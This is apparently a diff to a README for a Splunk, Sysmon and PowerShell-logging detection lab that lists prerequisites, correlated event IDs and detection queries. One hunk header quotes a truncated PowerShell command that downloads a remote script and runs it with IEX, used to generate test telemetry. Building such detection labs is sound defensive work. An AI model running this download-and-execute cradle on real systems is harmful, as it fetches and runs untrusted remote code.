@@ -2,7 +2,7 @@
 
 1. Prerequisites:
    - Splunk Enterprise installed on ubuntu-soc, listening for UF on port 9997.
-   - Splunk Universal Forwarder installed and configured on the Windows host (`inputs.conf`, `outputs.conf` in `*/SplunkUniversalForwarder/etc/system/local/`).
+   - Splunk Universal Forwarder installed and configured on the Windows host (`configs/inputs.conf`, `configs/outputs.conf` in `*/SplunkUniversalForwarder/etc/system/local/`).
    - Sysmon installed on Windows with ProcessCreate (EventID=1) logging enabled.
    - Enable Module Logging and Script Block Logging (Local Group Policy or GPO).
    - Confirm Microsoft-Windows-PowerShell/Operational channel is active.
@@ -26,4 +26,4 @@ powershell -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('h
   - PowerShell Operational - EventID=4104 (ScriptBlockExecuted / ScriptBlockText contains payload or IEX/DownloadString)
 These three events should correlate by _time, host, and ProcessId/CommandLine.
 
-5. In Splunk Search run `queries/powershell_process_creation.spl`, `suspicious_scriptblock.spl`, `sysmon_process_create.spl`.
+5. In Splunk Search run `queries/powershell_process_creation.spl`, `queries/suspicious_scriptblock.spl`, `queries/sysmon_process_create.spl`.
